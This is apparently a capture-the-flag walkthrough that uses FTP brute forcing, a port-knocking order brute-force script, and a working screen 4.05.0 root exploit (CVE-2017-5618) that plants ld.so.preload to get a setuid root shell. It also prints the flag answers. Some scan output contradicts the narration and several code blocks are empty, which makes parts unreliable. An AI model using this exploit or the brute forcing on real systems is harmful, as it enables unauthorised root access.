Before we start, read more about following tools & vulnerabilities. It will contains in this CTF
- [hydra](https://www.cyberpunk.rs/password-cracker-thc-hydra)
- [screen](https://www.gnu.org/software/screen/) - [CVE-2017-5618](https://www.cvedetails.com/cve/CVE-2017-5618/)
- [knock](https://linux.die.net/man/1/knock)

and also you can read more about additional security method called [port knocking](https://www.howtogeek.com/442733/how-to-use-port-knocking-on-linux-and-why-you-shouldnt/)

So let's start as usual with __nmap__.
```bash
nmap -F --top-ports 10 -sV 10.10.219.90
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-10 16:37 CET

Host is up (0.38s latency).

PORT     STATE  SERVICE        VERSION

22/tcp   closed ssh

443/tcp  open   https?
445/tcp  open   microsoft-ds?
3389/tcp open   ms-wbt-server?
```

After scan, we can see many ports open, but only from FTP we have grabbed banner *vsftpd 2.0.8 or later*. 
From description of this game we know the developer's name: *Jerry*, so we can try brute force attack to FTP server.

```bash

And voilÃ , we have a password: __prumpy__.
Connect to FTP with jerry:prumpy and let's find out what is hide inside.

```bash

Two files, first with flag, the second with some interesting notes.

```bash
$ cat flag1
79eb173ecb02d12d6d4832881be2cf23
```

- __FLAG1: 79eb173ecb02d12d6d4832881be2cf23__

```bash
$ cat note
Jerry, I finally got a chance to update our internal social media platform (bookface.com).

Can you signup and like my doggo photos?

Thanks
```

Ouu, there is also some domain, lets look on it, if we can find there something interesting.
After couple of requests to different types of DNS records, I found the the right one. 
In TXT record there are flag and also some ports, but wait. Why was there so many ports open?

```bash
host -t txt bookface.com 10.10.219.90

bookface.com descriptive text "Flag2:a17f17ba86d8271da60ed8436667f412"
```

- __FLAG2: a17f17ba86d8271da60ed8436667f412__

It looks like port knocking now. But according to comment we don't know order of ports, 
so I wrote port-knocking-enumeration to brute force the order.

source: port-knocking-enumeration.sh
```bash
#!/bin/bash

porta=(8748 3443 6786 9893)
portb=(6786 9893 8748 3443)
portc=(9893 8748 3443 6786)
portd=(3443 6786 9893 8748)
ip="10.10.213.66"

for a in ${porta[@]}; do
        for b in ${portb[@]}; do
                for c in ${portc[@]}; do
                        for d in ${portd[@]}; do
                                echo "$a $b $c $d"
                                knock $ip $a $b $c $d && nmap -p 22 $ip 2>&1 | grep "open" && echo "[SUCCESS!!] $a $b $c $d" && exit
                                sleep 1
                        done
                done
        done
done
```

Let's brute force it!

```bash
$ ./port-knocking-enumeration.sh 
8748 6786 9893 3443
8748 6786 9893 6786
8748 6786 9893 9893

8748 6786 3443 8748
8748 6786 6786 3443
8748 6786 6786 6786
8748 6786 6786 9893
8748 6786 6786 8748
8748 9893 9893 3443
8748 9893 9893 6786
8748 9893 9893 9893
8748 9893 9893 8748
8748 9893 8748 3443
8748 9893 8748 6786
8748 9893 8748 9893
8748 9893 8748 8748
8748 9893 3443 3443
8748 9893 3443 6786
8748 9893 3443 9893
8748 9893 3443 8748
8748 9893 6786 3443
22/tcp open  ssh
[SUCCESS!!] 8748 9893 6786 3443
```

Now we have the right order! We can verify it..

```bash
$ knock 10.10.213.66 8748 9893 6786 3443 && nmap -sV -p22 10.10.213.66

aand connect to ssh. Password is same as on FTP of course ;)

```bash

jerry@ip-10-10-213-66:~$ 
```

We're in, so let's find another flag.

```bash
jerry@ip-10-10-213-66:/home$ find / -name "flag3" 2>/dev/null
/home/flag3
jerry@ip-10-10-213-66:/home$ cat /home/flag3 
dd059316033c59f00057e5552140f831
```

- __FLAG3: dd059316033c59f00057e5552140f831__

Okey, that was pretty easy, but for the last one flag we will need the root priviledges.
So how to find vulnerability to gain the root priviledges? Let's search some binaries with
[setuid bit flag](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits).

```bash
jerry@ip-10-10-140-162:/etc$ find / -perm -u=s -type f 2>/dev/null
/snap/core/5742/bin/mount                                
/snap/core/5742/bin/ping

/snap/core/5742/usr/bin/newgrp
...
/bin/umount
/bin/fusermount
/bin/ntfs-3g
/bin/ping
/bin/su
/bin/ping6
/bin/screen-4.5.0/screen-4.05.0
/bin/mount
```

only *screen* has a version in a name of file and that's interesting. 
We can look at the internet and find the exploit if exists. 
The best way how to find the correct exploit and not malware :) 
is on [exploit-db](https://www.exploit-db.com) website from offensive-security.

I found one that could works. 
[exploit](https://www.exploit-db.com/exploits/41154)


```bash
$ cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF

$ gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c                                                      
$ ls /tmp/                                          
$ cat << EOF > /tmp/rootshell.c                                                                               
#include <stdio.h>                                       
int main(void){                                          
    setuid(0);                                           
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);                       
}        
EOF    
                            
$ gcc -o /tmp/rootshell /tmp/rootshell.c
$ cd /etc/
$ umask 000
$ screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"                                                
$ /bin/screen-4.5.0/screen-4.05.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"                       
$ /tmp/rootshell 
```
And now we have root priviledges, so let's take the last one flag.

```bash
# cat /root/flag4
6b873b86b1f3eb170554af54fddb8267
```

- __FLAG4: 6b873b86b1f3eb170554af54fddb8267__

I hope you enjoy the game and learn something new.
Bye;)
